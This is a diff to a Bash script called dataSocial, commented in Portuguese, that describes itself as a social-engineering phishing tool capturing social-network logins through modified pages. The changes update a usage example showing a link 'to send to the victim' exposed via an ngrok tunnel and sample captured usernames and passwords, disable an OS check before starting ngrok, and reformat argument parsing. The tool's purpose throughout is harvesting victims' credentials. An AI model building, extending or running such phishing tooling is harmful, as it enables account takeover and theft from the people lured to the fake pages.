@@ -9,19 +9,22 @@
 # Este programa captura dados de redes sociais através de páginas sociais modificadas utilizando a técnica phishing de engenharia social.
 #
 # Exemplo:
-# $ ./dataSocial --service facebook --listen --tunnel ngrok
-#  [+] Dados para enviar a vítima:
-#  [+] Localhost: localhost:5555
-#  [+] Ngrok addr: http://localhost:5555
-#  [+] Ngrok public: https://8bed-191-96-225-179.sa.ngrok.io
-#  [*] Escultando conexão...
-#  [-] Conexão aberta: 191.96.225.179
-#  [-] Credenciais capturadas:
-#  [-] Usuário: root@yahoo.com
-#  [-] Senha: toor
-#  [?] Digite 'ctr+C' OU 'quit' para cancelar
-#  ^C
-#  Programa interrompido!
+#
+# $ ./dataSocial -s facebook -l -t ngrok
+#
+# [+] Dados para enviar a vítima:
+# [+] Localhost: localhost:5555
+# [+] Ngrok localhost: http://localhost:5555
+# [+] Ngrok URL: https://00c8-191-96-225-179.sa.ngrok.io
+# [-] Nova conexão aberta: 127.0.0.1
+# [-] Credenciais capturadas:
+# [+] Seu log está em logs/dataSocial.txt
+# [-] Usuário: example@server.com
+# [-] Senha: teste
+# [?] Digite 'ctr+C' OU 'quit' para cancelar OU 'rerun' para realizar novamente este ataque
+# quit
+#
+# [×] Programa interrompido
 #
 # Histórico:
 #
@@ -130,7 +133,7 @@ copyFiles() {
 
 tunnel() {
     if [ "$tunnel" == "ngrok" ] ; then
-        verifySystemOs
+        #verifySystemOs
         ngrok http $port --log=stdout > /dev/null 2>&1 &
         sleep 3
         showLinkNgrok
@@ -257,7 +260,7 @@ installReqIfNotExists() {
     case "$(dpkg --print-architecture)" in
 	aarch64)
 	    arch="arm64";;
-        armhf|arm)
+        armhf | arm)
 	    arch="arm";;
 	amd64)
 	    arch="amd64";;
@@ -343,10 +346,13 @@ fi
 
 while [ -n "$1" ] ; do
     case "$1" in
-	-h|--help) helper;;
-	-v|--version) version;;
-	-L|--list) list;;
-	-s|--service)
+	-h | --help)
+	    helper;;
+	-v | --version)
+	    version;;
+	-L | --list)
+	    list;;
+	-s | --service)
 	    shift
 
 	    if [ -z "$1" ] ; then
@@ -357,8 +363,9 @@ while [ -n "$1" ] ; do
 	    serviceKey=1
 	    service="$1";;
 
-	-l|--listen) listenKey=1;;
-	-t|--tunnel)
+	-l | --listen)
+	    listenKey=1;;
+	-t | --tunnel)
 	    shift
 
 	    if [ -z "$1" ] ; then
